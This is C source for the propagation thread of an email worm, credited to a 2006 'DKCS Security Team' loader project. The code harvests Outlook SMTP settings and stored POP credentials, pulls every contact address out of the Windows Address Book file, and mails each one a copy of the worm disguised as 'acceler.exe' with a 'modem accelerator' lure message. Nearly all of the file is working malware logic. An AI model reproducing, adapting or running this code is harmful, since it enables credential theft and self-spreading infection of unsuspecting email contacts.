//-----------------------------------------------------------------
// this file is a part of: DKCS LoadSystem v. 0.1a
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
// Special work for Panda
//-----------------------------------------------------------------
#include "./Z_worm/smtp.h"
//-----------------------------------------------------------------
#define BUFF	0xFF
//-----------------------------------------------------------------
const char TextMessage[] = "Hellow, in attach i send my favorite modem accelerator!";
//-----------------------------------------------------------------
DWORD WINAPI EMAILWormThread(LPVOID){

	HKEY			k;
	DWORD			i;
	DWORD			dw;
	DWORD			cnt;
	DWORD			base1;
	DWORD			maxsize;
	HANDLE			hFile;
	HANDLE			hMap;
	register DWORD	b;
	register DWORD	j;
	unsigned char	*ptr;
	char			email_addr[BUFF];
	char			filename[BUFF];
	char			attach_p[BUFF];

	READLINESTRUCT RLS;
	LPATTACHLIST attach;
	LPMAILSTRUCT email = (LPMAILSTRUCT)malloc(sizeof(MAILSTRUCT));
	CreateREADLINESTRUCT(&RLS, 512);
	_srand();
	EnumOutlookAccounts();
    EnumPStorage(TRUE);
	strcpy(email->smtp_server, OutlookData[0].SMTPserver);
	email->smtp_port = 25;
	strcpy(email->smtp_user, OutlookData[0].POPuser);
	strcpy(email->smtp_pass, OutlookData[0].POPpass);
	strcpy(email->mail_from, OutlookData[0].SMTPmail);
	char from[150];
	wsprintf(from, "%s <%s>", OutlookData[0].SMTPdisp, OutlookData[0].SMTPmail);
	strcpy(email->header_from, from);
	strcpy(email->header_subject, "");
	email->content_text_type = CTT_HTML;
	email->charset_encoding = CE_WINDOWS1251;
	email->text = (char*)TextMessage;
	email->attachs = (LPATTACHLIST)malloc(sizeof(ATTACHLIST));
	attach = email->attachs;    
	GetSystemDirectory(attach_p, BUFF);
	strcat(attach_p, "\\");
	strcat(attach_p, MY_MACRO_RECORD_NAME);
	strcat(attach_p, ".exe\0");
	strcpy(attach->attach_name, "acceler.exe");
	strcpy(attach->file_path, attach_p);
	attach->next = 0;
	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\WAB\\WAB4\\Wab File Name", 0, KEY_READ, &k);
	RegQueryValueEx(k, NULL, NULL, NULL, (unsigned char*)filename, &dw);
	RegCloseKey(k);
	hFile = CreateFile((const char*)filename, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == NULL || hFile == INVALID_HANDLE_VALUE){
		return FALSE;
	}
	maxsize = GetFileSize(hFile, NULL);
	hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
	if(hMap == NULL || hMap == INVALID_HANDLE_VALUE){
		CloseHandle(hFile);
		return FALSE;
	}
	ptr = (unsigned char *)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
	if(ptr == NULL){
		CloseHandle(hMap);
		CloseHandle(hFile);
		return FALSE;
	}
	base1 = *((DWORD *)(ptr + 0x60));
	cnt = *((DWORD *)(ptr + 0x64));
	for(i = 0; i < cnt; i++){
		b = base1 + i * 68;
		memset(email_addr, '\0', sizeof(email_addr));
		for(j = 0; (b < maxsize) && (j < 68); j++, b+=2){
			email_addr[j] = ptr[b];
			if(ptr[b] == 0){
				break;
			}
		}
		if(j > 0){
			strcpy(email->rcpt_to, email_addr);
			smtp_sendmail(email, &RLS);
		}
	}
	UnmapViewOfFile(ptr);
	CloseHandle(hMap);
	CloseHandle(hFile);
	free(email);
	FreeREADLINESTRUCT(&RLS);
	ExitThread(1);
return TRUE;
}
//-----------------------------------------------------------------